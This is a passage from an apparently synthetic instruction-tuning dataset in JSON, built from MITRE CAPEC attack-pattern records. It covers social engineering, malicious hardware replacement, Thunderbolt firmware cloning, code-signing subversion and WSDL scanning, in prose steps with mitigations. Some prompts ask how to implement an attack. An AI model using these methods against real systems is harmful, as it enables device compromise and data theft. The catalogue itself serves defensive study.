            "Submission_Name": "CAPEC Content Team",
            "Submission_Date": "2018-07-31"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Influence Perception of Authority (CAPEC ID: 421)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Influence Perception of Authority (CAPEC ID: 421) are: The adversary calls the target and announces that they are the head of IT at the target's company. The adversary goes on to say that there has been a technical issue and they need the target's login credentials for their account. By convincing the target of their authority, the adversary hopes the target will reveal the sensitive information.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The adversary calls the target and announces that they are the head of IT at the target's company. The adversary goes on to say that there has been a technical issue and they need the target's login credentials for their account. By convincing the target of their authority, the adversary hopes the target will reveal the sensitive information.",
      "@Name": "Influence Perception of Authority (CAPEC ID: 421)",
      "attack_ptrn": {
        "@ID": "421",
        "@Name": "Influence Perception of Authority",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses a social engineering technique to convey a sense of authority that motivates the target to reveal specific information or take specific action. There are various techniques for producing a sense of authority during ordinary modes of communication. One common method is impersonation. By impersonating someone with a position of power within an organization, an adversary may motivate the target individual to reveal some piece of sensitive information or perform an action that benefits the adversary.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "417"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have the means and knowledge of how to communicate with the target in some manner."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary requires strong inter-personal and communication skills."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Integrity",
              "Availability"
            ],
            "Impact": "Other",
            "Note": "Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system."
          }
        },
        "Mitigations": {
          "Mitigation": "An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks."
        },
        "Example_Instances": {
          "Example": "The adversary calls the target and announces that they are the head of IT at the target's company. The adversary goes on to say that there has been a technical issue and they need the target's login credentials for their account. By convincing the target of their authority, the adversary hopes the target will reveal the sensitive information."
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-348"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-08-04",
            "#text": "Target Influence via Perception of Authority"
          }
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Malicious Hardware Update (CAPEC ID: 534)",
    "context": "",
    "output": "An adversary develops a malicious networking card that allows for normal function plus the addition of malicious functionality that is of benefit to the adversary. The adversary sends the victim an email stating that the existing networking card is faulty, and that the victim can order a replacement card free of charge. The victim orders the card, and the adversary sends the malicious networking card. The malicious networking card replaces the perfectly-functioning original networking card, and the adversary is able to take advantage of the additional malicious functionality to further compromise the victim's network.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary develops a malicious networking card that allows for normal function plus the addition of malicious functionality that is of benefit to the adversary. The adversary sends the victim an email stating that the existing networking card is faulty, and that the victim can order a replacement card free of charge. The victim orders the card, and the adversary sends the malicious networking card. The malicious networking card replaces the perfectly-functioning original networking card, and the adversary is able to take advantage of the additional malicious functionality to further compromise the victim's network.",
      "@Name": "Malicious Hardware Update (CAPEC ID: 534)",
      "attack_ptrn": {
        "@ID": "534",
        "@Name": "Malicious Hardware Update",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary introduces malicious hardware during an update or replacement procedure, allowing for additional compromise or site disruption at the victim location. After deployment, it is not uncommon for upgrades and replacements to occur involving hardware and various replaceable parts. These upgrades and replacements are intended to correct defects, provide additional features, and to replace broken or worn-out parts. However, by forcing or tricking the replacement of a good component with a defective or corrupted component, an adversary can leverage known defects to obtain a desired malicious impact.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "440"
          }
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts."
          }
        },
        "Example_Instances": {
          "Example": "An adversary develops a malicious networking card that allows for normal function plus the addition of malicious functionality that is of benefit to the adversary. The adversary sends the victim an email stating that the existing networking card is faulty, and that the victim can order a replacement card free of charge. The victim orders the card, and the adversary sends the malicious networking card. The malicious networking card replaces the perfectly-functioning original networking card, and the adversary is able to take advantage of the additional malicious functionality to further compromise the victim's network."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-711"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Examples-Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated References"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Exploitation of Thunderbolt Protection Flaws (CAPEC ID: 665)",
    "context": "",
    "output": "Examples of Exploitation of Thunderbolt Protection Flaws (CAPEC ID: 665) are: An adversary steals a password protected laptop that contains a Thunderbolt 3 enabled port, from a work environment. The adversary uses a screw driver to remove the back panel of the laptop and connects a SPI Programming device to the Thunderbolt Host Controller SPI Flash of the stolen victim device to interface with it on the adversary's own Thunderbolt enabled device via Thunderbolt cables. The SPI Programming device is utilized to execute scripts/tools from the adversary's own system to copy, parse, and modify the victim's Thunderbolt firmware stored on SPI Flash. The device UUID value is obtained, by computing the appropriate offset based upon Thunderbolt firmware version and the OS of victim device, from the DROM section of victim Thunderbolt host controller firmware image. The firmware image is written to adversary Thunderbolt host controller SPI flash to clone and spoof victim device identity. The adversary reboots the victim device, with the victim device identifying the Thunderbolt connection of the adversary's Thunderbolt device as itself and enables PCIe tunneling. The adversary finally transfers the hard drive and memory contents of victim device across Thunderbolt connection.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary steals a password protected laptop that contains a Thunderbolt 3 enabled port, from a work environment. The adversary uses a screw driver to remove the back panel of the laptop and connects a SPI Programming device to the Thunderbolt Host Controller SPI Flash of the stolen victim device to interface with it on the adversary's own Thunderbolt enabled device via Thunderbolt cables. The SPI Programming device is utilized to execute scripts/tools from the adversary's own system to copy, parse, and modify the victim's Thunderbolt firmware stored on SPI Flash. The device UUID value is obtained, by computing the appropriate offset based upon Thunderbolt firmware version and the OS of victim device, from the DROM section of victim Thunderbolt host controller firmware image. The firmware image is written to adversary Thunderbolt host controller SPI flash to clone and spoof victim device identity. The adversary reboots the victim device, with the victim device identifying the Thunderbolt connection of the adversary's Thunderbolt device as itself and enables PCIe tunneling. The adversary finally transfers the hard drive and memory contents of victim device across Thunderbolt connection.",
      "@Name": "Exploitation of Thunderbolt Protection Flaws (CAPEC ID: 665)",
      "attack_ptrn": {
        "@ID": "665",
        "@Name": "Exploitation of Thunderbolt Protection Flaws",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary leverages a firmware weakness within the Thunderbolt protocol, on a computing device to manipulate Thunderbolt controller firmware in order to exploit vulnerabilities in the implementation of authorization and verification schemes within Thunderbolt protection mechanisms. Upon gaining physical access to a target device, the adversary conducts high-level firmware manipulation of the victim Thunderbolt controller SPI (Serial Peripheral Interface) flash, through the use of a SPI Programing device and an external Thunderbolt device, typically as the target device is booting up. If successful, this allows the adversary to modify memory, subvert authentication mechanisms, spoof identities and content, and extract data and memory from the target device. Currently 7 major vulnerabilities exist within Thunderbolt protocol with 9 attack vectors as noted in the Execution Flow."
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "276"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "390"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "458"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "148"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "151"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey physical victim environment and potential Thunderbolt system targets] The adversary monitors the target's physical environment to identify systems with Thunderbolt interfaces, identify potential weaknesses in physical security in addition to periods of nonattendance by the victim over their Thunderbolt interface equipped devices, and when the devices are in locked or sleep state."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Evaluate the target system and its Thunderbolt interface] The adversary determines the device's operating system, Thunderbolt interface version, and any implemented Thunderbolt protections to plan the attack."
            },
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Obtain and/or clone firmware image] The adversary physically manipulates Thunderbolt enabled devices to acquire the firmware image from the target and/or adversary Thunderbolt host controller's SPI (Serial Peripheral Interface) flash.",
              "Technique": [
                "Disassemble victim and/or adversary device enclosure with basic tools to gain access to Thunderbolt controller SPI flash by connecting adversary SPI programmer.",
                "Adversary connects SPI programmer to adversary-controlled Thunderbolt enabled device to obtain/clone victim thunderbolt controller firmware image through tools/scripts.",
                "Clone firmware image with SPI programmer and tools/scripts on adversary-controlled device."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Parse and locate relevant firmware data structures and information based upon Thunderbolt controller model, firmware version, and other information] The acquired victim and/or adversary firmware image is parsed for specific data and other relevant identifiers required for exploitation, based upon the victim device information and firmware version.",
              "Technique": [
                "Utilize pre-crafted tools/scripts to parse and locate desired firmware data and modify it.",
                "Locate DROM (Device Read Only Memory) data structure section and calculate/determine appropriate offset to replicate victim device UUID.",
                "Locate ACL (Access Control List) data structure and calculate/determine appropriate offsets to identify victim device UUID.",
                "Locate data structure containing challenge-response key information between appropriate offsets."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Disable Thunderbolt security and prevent future Thunderbolt security modifications (if necessary)] The adversary overrides the target device's Thunderbolt Security Level to \"None\" (SL0) and/or enables block protections upon the SPI flash to prevent the ability for the victim to perform and/or recognize future Thunderbolt security modifications as well as update the Thunderbolt firmware.",
              "Technique": "The adversary-controlled Thunderbolt device, connected to SPI programmer and victim device via Thunderbolt ports, is utilized to execute commands within tools/scripts to disable SPI flash protections, modify Thunderbolt Security Level, and enable malicious SPI flash protections."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Modify/replace victim Thunderbolt firmware image] The modified victim and/or adversary thunderbolt firmware image is written to attacker SPI flash."
            },
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "[Connect adversary-controlled thunderbolt enabled device to victim device and verify successful execution of malicious actions] The adversary needs to determine if their exploitation of selected vulnerabilities had the intended effects upon victim device.",
              "Technique": [
                "Observe victim device identify adversary device as the victim device and enables PCIe tunneling.",
                "Resume victim device from sleep, connect adversary-controlled device and observe security is disabled and Thunderbolt connectivity is restored with PCIe tunneling being enabled.",
                "Observe that in UEFI or Thunderbolt Management Tool/UI that the Security Level does not match adversary modified Security Level of \"None\" (SL0)",
                "Observe after installation of Firmware update that within Thunderbolt Management UI the \"NVM version\" is unchanged/same prior to the prompt of successful Firmware update/installation."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Exfiltration of desired data from victim device to adversary device] Utilize PCIe tunneling to transfer desired data and information from victim device across Thunderbolt connection."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary needs at least a few minutes of physical access to a system with an open Thunderbolt port, version 3 or lower, and an external thunderbolt device controlled by the adversary with maliciously crafted software and firmware, via an SPI Programming device, to exploit weaknesses in security protections."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Detailed knowledge on various system motherboards, PCI Express Domain, SPI, and Thunderbolt Protocol in order to interface with internal system components via external devices."
            },
            {
              "@Level": "High",
              "#text": "Detailed knowledge on OS/Kernel memory address space, Direct Memory Access (DMA) mapping, Input-Output Memory Management Units (IOMMUs), and vendor memory protections for data leakage."
            },
            {
              "@Level": "High",
              "#text": "Detailed knowledge on scripting and SPI programming in order to configure and modify Thunderbolt controller firmware and software configurations."
            }
          ]
        },
        "Resources_Required": {
          "Resource": [
            "SPI Programming device capable of modifying/configuring or replacing the firmware of Thunderbolt device stored on SPI Flash of target Thunderbolt controller, as well as modification/spoofing of adversary-controlled Thunderbolt controller.",
            "Precrafted scripts/tools capable of implementing the modification and replacement of Thunderbolt Firmware.",
            "Thunderbolt-enabled computing device capable of interfacing with target Thunderbolt device and extracting/dumping data and memory contents of target device."
          ]
        },
        "Indicators": {
          "Indicator": "Windows Event logs may document the access of Thunderbolt port as a USB 3.0 event as well as any malicious actions taken upon target device as file system and memory events."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Access Control",
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: Kernel Direct Memory Access Protection",
            "Configuration: Enable UEFI option USB Passthrough mode - Thunderbolt 3 system port operates as USB 3.1 Type C interface",
            "Configuration: Enable UEFI option DisplayPort mode - Thunderbolt 3 system port operates as video-only DP interface",
            "Configuration: Enable UEFI option Mixed USB/DisplayPort mode - Thunderbolt 3 system port operates as USB 3.1 Type C interface with support for DP mode",
            "Configuration: Set Security Level to SL3 for Thunderbolt 2 system port",
            "Configuration: Disable PCIe tunneling to set Security Level to SL3",
            "Configuration: Disable Boot Camp upon MacOS systems"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "An adversary steals a password protected laptop that contains a Thunderbolt 3 enabled port, from a work environment. The adversary uses a screw driver to remove the back panel of the laptop and connects a SPI Programming device to the Thunderbolt Host Controller SPI Flash of the stolen victim device to interface with it on the adversary's own Thunderbolt enabled device via Thunderbolt cables. The SPI Programming device is utilized to execute scripts/tools from the adversary's own system to copy, parse, and modify the victim's Thunderbolt firmware stored on SPI Flash. The device UUID value is obtained, by computing the appropriate offset based upon Thunderbolt firmware version and the OS of victim device, from the DROM section of victim Thunderbolt host controller firmware image. The firmware image is written to adversary Thunderbolt host controller SPI flash to clone and spoof victim device identity. The adversary reboots the victim device, with the victim device identifying the Thunderbolt connection of the adversary's Thunderbolt device as itself and enables PCIe tunneling. The adversary finally transfers the hard drive and memory contents of victim device across Thunderbolt connection."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "353"
            },
            {
              "@CWE_ID": "288"
            },
            {
              "@CWE_ID": "1188"
            },
            {
              "@CWE_ID": "862"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1211",
              "Entry_Name": "Exploitation for Defensive Evasion"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1542.002",
              "Entry_Name": "Pre-OS Boot: Component Firmware"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1556",
              "Entry_Name": "Modify Authentication Process"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-647"
            },
            {
              "@External_Reference_ID": "REF-648"
            },
            {
              "@External_Reference_ID": "REF-649"
            },
            {
              "@External_Reference_ID": "REF-650"
            },
            {
              "@External_Reference_ID": "REF-651"
            },
            {
              "@External_Reference_ID": "REF-652"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Subvert Code-signing Facilities (CAPEC ID: 68)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: In old versions (prior to 3.0b4) of the Netscape web browser Attackers able to foist a malicious Applet into a client's browser could execute the \"Magic Coat\" attack. In this attack, the offending Applet would implement its own getSigners() method. This implementation would use the containing VM's APIs to acquire other Applet's signatures (by calling _their_ getSigners() method) and if any running Applet had privileged-enough signature, the malicious Applet would have inherited that privilege just be (metaphorically) donning the others' coats.\n- Some (older) web browsers allowed scripting languages, such as JavaScript, to call signed Java code. In these circumstances, the browser's VM implementation would choose not to conduct stack inspection across language boundaries (from called signed Java to calling JavaScript) and would short-circuit \"true\" at the language boundary. Doing so meant that the VM would allow any (unprivileged) script to call privileged functions within signed code with impunity, causing them to fall prey to luring attacks.\n- The ability to load unsigned code into the kernel of earlier versions of Vista and bypass integrity checking is an example of such subversion. In the proof-of-concept, it is possible to bypass the signature-checking mechanism Vista uses to load device drivers.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "In old versions (prior to 3.0b4) of the Netscape web browser Attackers able to foist a malicious Applet into a client's browser could execute the \"Magic Coat\" attack. In this attack, the offending Applet would implement its own getSigners() method. This implementation would use the containing VM's APIs to acquire other Applet's signatures (by calling _their_ getSigners() method) and if any running Applet had privileged-enough signature, the malicious Applet would have inherited that privilege just be (metaphorically) donning the others' coats.",
        "Some (older) web browsers allowed scripting languages, such as JavaScript, to call signed Java code. In these circumstances, the browser's VM implementation would choose not to conduct stack inspection across language boundaries (from called signed Java to calling JavaScript) and would short-circuit \"true\" at the language boundary. Doing so meant that the VM would allow any (unprivileged) script to call privileged functions within signed code with impunity, causing them to fall prey to luring attacks.",
        "The ability to load unsigned code into the kernel of earlier versions of Vista and bypass integrity checking is an example of such subversion. In the proof-of-concept, it is possible to bypass the signature-checking mechanism Vista uses to load device drivers."
      ],
      "@Name": "Subvert Code-signing Facilities (CAPEC ID: 68)",
      "attack_ptrn": {
        "@ID": "68",
        "@Name": "Subvert Code-signing Facilities",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "233"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "A framework-based language that supports code signing (such as, and most commonly, Java or .NET)",
            "Deployed code that has been signed by its authoring vendor, or a partner.",
            "The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Subverting code signing is not a trivial activity. Most code signing and verification schemes are based on use of cryptography and the attacker needs to have an understanding of these cryptographic operations in good detail. Additionally the attacker also needs to be aware of the way memory is assigned and accessed by the container since, often, the only way to subvert code signing would be to patch the code in memory. Finally, a knowledge of the platform specific mechanisms of signing and verifying code is a must."
          }
        },
        "Resources_Required": {
          "Resource": "The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "A given code signing scheme may be fallible due to improper use of cryptography. Developers must never roll out their own cryptography, nor should existing primitives be modified or ignored.",
            "If an attacker cannot attack the scheme directly, they might try to alter the environment that affects the signing and verification processes. A possible mitigation is to avoid reliance on flags or environment variables that are user-controllable."
          ]
        },
        "Example_Instances": {
          "Example": [
            "In old versions (prior to 3.0b4) of the Netscape web browser Attackers able to foist a malicious Applet into a client's browser could execute the \"Magic Coat\" attack. In this attack, the offending Applet would implement its own getSigners() method. This implementation would use the containing VM's APIs to acquire other Applet's signatures (by calling _their_ getSigners() method) and if any running Applet had privileged-enough signature, the malicious Applet would have inherited that privilege just be (metaphorically) donning the others' coats.",
            "Some (older) web browsers allowed scripting languages, such as JavaScript, to call signed Java code. In these circumstances, the browser's VM implementation would choose not to conduct stack inspection across language boundaries (from called signed Java to calling JavaScript) and would short-circuit \"true\" at the language boundary. Doing so meant that the VM would allow any (unprivileged) script to call privileged functions within signed code with impunity, causing them to fall prey to luring attacks.",
            "The ability to load unsigned code into the kernel of earlier versions of Vista and bypass integrity checking is an example of such subversion. In the proof-of-concept, it is possible to bypass the signature-checking mechanism Vista uses to load device drivers."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "325"
            },
            {
              "@CWE_ID": "328"
            },
            {
              "@CWE_ID": "1326"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1553.002",
            "Entry_Name": "Subvert Trust Controls: Code Signing"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Physically Hacking Hardware (CAPEC ID: 401)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: A malicious subcontractor or subcontractor's employee that is responsible for system maintenance secretly replaces a hard drive with one containing malicious code that will allow for backdoor access once deployed.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A malicious subcontractor or subcontractor's employee that is responsible for system maintenance secretly replaces a hard drive with one containing malicious code that will allow for backdoor access once deployed.",
      "@Name": "Physically Hacking Hardware (CAPEC ID: 401)",
      "attack_ptrn": {
        "@ID": "401",
        "@Name": "Physically Hacking Hardware",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary exploits a weakness in access control to gain access to currently installed hardware and precedes to implement changes or secretly replace a hardware component which undermines the system's integrity for the purpose of carrying out an attack.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "440"
          }
        },
        "Example_Instances": {
          "Example": "A malicious subcontractor or subcontractor's employee that is responsible for system maintenance secretly replaces a hard drive with one containing malicious code that will allow for backdoor access once deployed."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1263"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Examples-Instances, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Name, Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-11-09",
              "#text": "Hacking Hardware Devices or Components"
            },
            {
              "@Date": "2020-07-30",
              "#text": "Hacking Hardware"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: WSDL Scanning (CAPEC ID: 95)",
    "context": "",
    "output": "Possible examples: A WSDL interface may expose a function vulnerable to SQL Injection.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A WSDL interface may expose a function vulnerable to SQL Injection."
      ],
      "@Name": "WSDL Scanning (CAPEC ID: 95)",
      "attack_ptrn": {
        "@ID": "95",
        "@Name": "WSDL Scanning",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack targets the WSDL interface made available by a web service. The attacker may scan the WSDL interface to reveal sensitive information about invocation patterns, underlying technology implementations and associated vulnerabilities. This type of probing is carried out to perform more serious attacks (e.g. parameter tampering, malicious content injection, command injection, etc.). WSDL files provide detailed information about the services ports and bindings available to consumers. For instance, the attacker can submit special characters or malicious content to the Web service and can cause a denial of service condition or illegal access to database records. In addition, the attacker may try to guess other private methods by using the information provided in the WSDL files.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "54"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Scan for WSDL Documents] The adversary scans for WSDL documents. The WDSL document written in XML is like a handbook on how to communicate with the web services provided by the target host. It provides an open view of the application (function details, purpose, functional break down, entry points, message types, etc.). This is very useful information for the adversary."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Analyze WSDL files] An adversary will analyze the WSDL files and try to find potential weaknesses by sending messages matching the pattern described in the WSDL file. The adversary could run through all of the operations with different message request patterns until a breach is identified."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Craft malicious content] Once an adversary finds a potential weakness, they can craft malicious content to be sent to the system. For instance the adversary may try to submit special characters and observe how the system reacts to an invalid request. The message sent by the adversary may not be XML validated and cause unexpected behavior."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
